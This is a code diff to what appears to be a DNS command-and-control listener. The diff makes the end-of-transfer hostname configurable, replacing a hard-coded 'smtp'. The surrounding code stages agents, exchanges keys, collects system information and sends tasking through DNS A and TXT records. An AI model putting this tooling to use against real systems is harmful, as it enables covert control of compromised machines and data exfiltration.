@@ -148,6 +148,11 @@ class Listener:
                 'Required'      :   True,
                 'Value'         :   'mailhost'
             },
+            'StopTransferData' : {
+                'Description'   :   'Hostname for indicating the end of an A data transfer',
+                'Required'      :   True,
+                'Value'         :   'smtp'
+            },
             'IPSwitchAtoTXT' : {
                 'Description'   :   'IP address which signifies that the stager/agent should switch from sending A record requests to TXT requests',
                 'Required'      :   True,
@@ -601,18 +606,18 @@ def send_message(packets=None):
             an=DNSRR(rrname=str(reply_hostname), type='TXT', rdata=''.join(random.choice(string.uppercase) for i in range(225)), ttl=300))
         sock.sendto(bytes(reply), reply_addr_tuple)
     
-    def is_eof_response(self, dns):
-        if str(dns[DNSQR].qname).startswith("smtp"):
+    def is_eof_response(self, dns, stoptransferdata):
+        if str(dns[DNSQR].qname).startswith(stoptransferdata):
             return True
         else:
             return False
         
-    def recv_data_via_a_record(self, sock, recv_hostname, ipack, addr, fake_domain, ipeof):
+    def recv_data_via_a_record(self, sock, recv_hostname, ipack, addr, fake_domain, ipeof, stoptransferdata):
         a_base32 = ""
         while True:
             data,server_dns=sock.recvfrom(512)
             a_dns = DNS(data)
-            if self.is_eof_response(a_dns):
+            if self.is_eof_response(a_dns, stoptransferdata):
                 self.send_a_record_reply_id(sock, recv_hostname, ipeof, server_dns, a_dns.id, a_dns.qd)
                 break
             self.send_a_record_reply_id(sock, recv_hostname, ipack, server_dns, a_dns.id, a_dns.qd)
@@ -736,13 +741,13 @@ def send_message(packets=None):
             print e
 
     # Stage 3 and 5
-    def process_a_records(self, sock, stagingKey, listenerOptions, recv_hostname, ipack, addr, fake_domain, astoptransfer, ipeof, reply_id, reply_qd):
+    def process_a_records(self, sock, stagingKey, listenerOptions, recv_hostname, ipack, addr, fake_domain, astoptransfer, ipeof, reply_id, reply_qd, stoptransferdata):
         self.send_a_record_reply_id(sock, recv_hostname, ipack, addr, reply_id, reply_qd)
-        data=self.recv_data_via_a_record(sock, recv_hostname, ipack, addr, fake_domain, ipeof)
+        data=self.recv_data_via_a_record(sock, recv_hostname, ipack, addr, fake_domain, ipeof, stoptransferdata)
         return data
 
     # Agent requests tasking information
-    def process_tasking_a(self, sock, stagingKey, listenerOptions, recv_hostname, ipack, ipnop, ipswitchatotxt, addr, fake_domain, astoptransfer, ipeof, reply_id, reply_qd):
+    def process_tasking_a(self, sock, stagingKey, listenerOptions, recv_hostname, ipack, ipnop, ipswitchatotxt, addr, fake_domain, astoptransfer, ipeof, reply_id, reply_qd, stoptransferdata):
         # ack tasking request from agent
         self.send_a_record_reply_id(sock, recv_hostname, ipack, addr, reply_id, reply_qd)
 
@@ -754,7 +759,7 @@ def send_message(packets=None):
             a_dns = DNS(data)
             #print "[PROCESS] recv hostname {}".format(a_dns[DNSQR].qname.decode('ascii'))
             a_host = a_dns[DNSQR].qname.decode('ascii')
-            if self.is_eof_response(a_dns):
+            if self.is_eof_response(a_dns, stoptransferdata):
                 #print "[PROCESS] BREAKING"
                 break
             a_host = a_host.replace('.' + fake_domain, "")
@@ -872,6 +877,7 @@ def send_message(packets=None):
         taskingtxthostname = listenerOptions['TaskingTXTHostname']['Value']
         txtstoptransfer = listenerOptions['TXTStopTransfer']['Value']
         astoptransfer = listenerOptions['AStopTransfer']['Value']
+        stoptransferdata = listenerOptions['StopTransferData']['Value']
         fake_domain = listenerOptions['FakeDomain']['Value']
         stagingKey = listenerOptions['StagingKey']['Value']
         stageone_results = ""
@@ -910,15 +916,15 @@ def send_message(packets=None):
                         # Stage 3 (Process client DH key) 
                         elif host.startswith(stagethreehostname):
                             print "[STAGE 3]"
-                            stagethree_results = self.process_a_records(sock, stagingKey, listenerOptions, host, ipack, addr, fake_domain, astoptransfer, ipeof, dns.id, dns.qd)
+                            stagethree_results = self.process_a_records(sock, stagingKey, listenerOptions, host, ipack, addr, fake_domain, astoptransfer, ipeof, dns.id, dns.qd, stoptransferdata)
                         # Stage 5 (Process encrypted nonce + sysinfo)
                         elif host.startswith(stagefivehostname):
                             print "[STAGE 5]"
-                            stagefive_results = self.process_a_records(sock, stagingKey, listenerOptions, host, ipack, addr, fake_domain, astoptransfer, ipeof, dns.id, dns.qd)
+                            stagefive_results = self.process_a_records(sock, stagingKey, listenerOptions, host, ipack, addr, fake_domain, astoptransfer, ipeof, dns.id, dns.qd, stoptransferdata)
                         # Tasking
                         elif host.startswith(taskinghostname):
                             print "[TASKING A]"
-                            tasking_results = self.process_tasking_a(sock, stagingKey, listenerOptions, host, ipack, ipnop, ipswitchatotxt, addr, fake_domain, astoptransfer, ipeof, dns.id, dns.qd)
+                            tasking_results = self.process_tasking_a(sock, stagingKey, listenerOptions, host, ipack, ipnop, ipswitchatotxt, addr, fake_domain, astoptransfer, ipeof, dns.id, dns.qd, stoptransferdata)
                         else:
                             self.default_response()
                     elif dns[DNSQR].qtype == 16:
